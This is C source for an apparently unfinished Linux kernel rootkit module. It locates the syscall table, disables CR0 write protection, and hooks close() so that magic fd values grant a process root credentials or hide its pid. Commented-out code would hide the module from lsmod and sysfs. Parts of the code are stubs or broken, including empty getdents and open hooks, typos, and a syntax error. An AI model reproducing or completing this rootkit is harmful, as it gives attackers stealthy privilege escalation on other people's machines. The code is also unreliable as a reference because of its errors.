#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/limits.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/spinlock.h>
#include <linux/list.h>
#include <asm/unistd.h>

#if defined(__386__)
#define SYSCALL_TABLE_START 0xc0000000
#define SYSCALL_TABLE_STOP 0xd0000000
typedef unsigned int pointer_size_t;
#else
#define SYSCALL_TABLE_START (unsigned long) 0xffffffff81000000l
#define SYSCALL_TABLE_STOP (unsigned long) 0xffffffffa2000000l
typedef unsigned long pointer_size_t;
#endif

struct hidden_pids_struct {
    pid_t pid;
    struct list_head list;
};

struct pathname_struct {
    void *pathname_buffer;
    spinlock_t pathname_buffer_lock;
};
struct pathname_struct pathname;

struct hidden_pids_struct hidden_pids;

/* pid of the process that has currently opened "/proc" */
pid_t pid_proc_open;
/* fd for opened "/proc" in this process */
int fd_proc_open;


/***************************************************************************/
/* SPECIAL VALUES FOR MALICIOUS COMMUNICATION BETWEEN PROCESSES AND ROOTKIT */
#define ELEVATE_UID -23121990
#define HIDE_PROCESS -19091992
#define SHOW_PROCESS -2051967


/***************************************************************************/


unsigned long **syscall_table;

asmlinkage int (*original_close)(int fd);
asmlinkage int (*original_open)(const char *pathname, int flags, int mode);


int elevate_current_privileges(void)
{
    int err = -1;

    struct cred *elevated_cred = prepare_creds();
    kuid_t elevated_uid;
    kgid_t elevated_gid;
    elevated_uid.val = 0;
    elevated_gid.val = 0;

    if (elevated_cred != NULL) {
        elevated_cred->uid = elevated_cred->euid = elevated_cred->suid
             = elevated_cred->fsuid = elevated_uid;
        elevated_cred->gid = elevated_cred->egid = elevated_cred->sgid
             = elevated_cred->fsgid = elevated_gid;

        commit_creds(elevated_cred);
        err = 0;
    }

    return err;
}

void init_hidden_pids_list(void)
{
    INIT_LIST_HEAD(&hidden_pids->list);
}

int is_in_hidden_pids(pit_t pid)
{
    struct hidden_pids_struct *iter;
    list_for_each_entry(iter, &hidden_pids->list, list) {
        if (iter->pid == pid)
            return 1;
    }
    return 0;
}

/* Remove this process's pid from our hidden pids list */
int show_current_process(void)
{
    struct hidden_pids_struct *iter, *tmp;
    pid_t pid = current->pid;
    list_for_each_entry_safe(iter, tmp, &hidden_pids->list, list) {
        if (iter->pid == pid) {
            list_del(&iter->list);
            kfree(iter);
            return 0;
        }
    }
    return -1;
}

/* Add this process's pid to our hidden pids list */
int hide_current_process(void)
{
    int err = 0;
    struct hidden_pids_struct *node;
    pid_t pid = current->pid;

    node = (struct hidden_pids_struct *)
            kmalloc(sizeof(struct hidden_pids_struct), GFP_KERNEL);
    if (node == NULL) {
        err = -1;
        goto out;
    }

    node->pid = pid;
    list_add_tail(&node->list, &hidden_pids->list);
out:
    return err;
}

asmlinkage int my_getdents(...)
{
    if (pid_proc_open == current->pid && fd_proc_open == fd) {
        /* this means that we'll get dents for "/proc"
           skip the one with pids in our hidden list */
    }


}
asmlinkage int my_open(const char __user *pathname, int flags, int mode)
{
    if (pid_proc_open == current->pid && )


}


asmlinkage int my_close(int fd)
{
    int err = 0;

    switch (fd) {
    case ELEVATE_UID:
        elevate_current_privileges();
        break;
    case HIDE_PROCESS:
        hide_current_process();
        break;
    case SHOW_PROCESS:
        show_current_process();
        break;
    default:
        err = original_close(fd);
    }

    return err;
}

pointer_size_t **find_syscall_table(void)
{
    pointer_size_t i;
    pointer_size_t **table;
    for (i = SYSCALL_TABLE_START; i < SYSCALL_TABLE_STOP; i += sizeof(void *)) {
        table = (pointer_size_t **) i;
        if ( table[__NR_close] == (pointer_size_t *) sys_close)
            return &table[0];
    }
    return NULL;
}




int rootkit_init(void)
{
    printk("Rootkit loaded\n");
    

    /* Uncomment the following lines after completion of module 
     * Can't rmmod it if we have it uncommented during dev
     * That's just cumbersome during dev
     */
    
    /*
    // stop from showing on lsmod
    list_del_init(&__this_module.list);

    // stop showing in /proc/kallsyms
    kobject_del(&THIS_MODULE->mkobj.kobj);
    */
    
    spin_lock_init(&(pathname.pathname_buffer_lock));
    pid_proc_open = -1;

    syscall_table = find_syscall_table();
    if (!syscall_table) {
        goto out;    
    }

    printk("Syscall table at %p\n", syscall_table);
    
    // make writable by disabling write protect
    write_cr0(read_cr0() & (~0x10000));

    // hijack chdir system call
    original_close = (asmlinkage int (*)(int)) syscall_table[__NR_close];
    syscall_table[__NR_close] = (void *) my_close;

    // enable write protected
    write_cr0(read_cr0() & 0x10000);




    init_hidden_pids_list();

    out:
    return 0;
}

void rootkit_exit(void)
{
    write_cr0(read_cr0() & (~0x10000));
    syscall_table[__NR_close] = (void *) original_close;
    write_cr0(read_cr0() & 0x10000);
    printk("Rootkit unloaded\n");
}


MODULE_LICENSE("GPL");
MODULE_AUTHOR("BufferOverflowers");
module_init(rootkit_init);
module_exit(rootkit_exit);
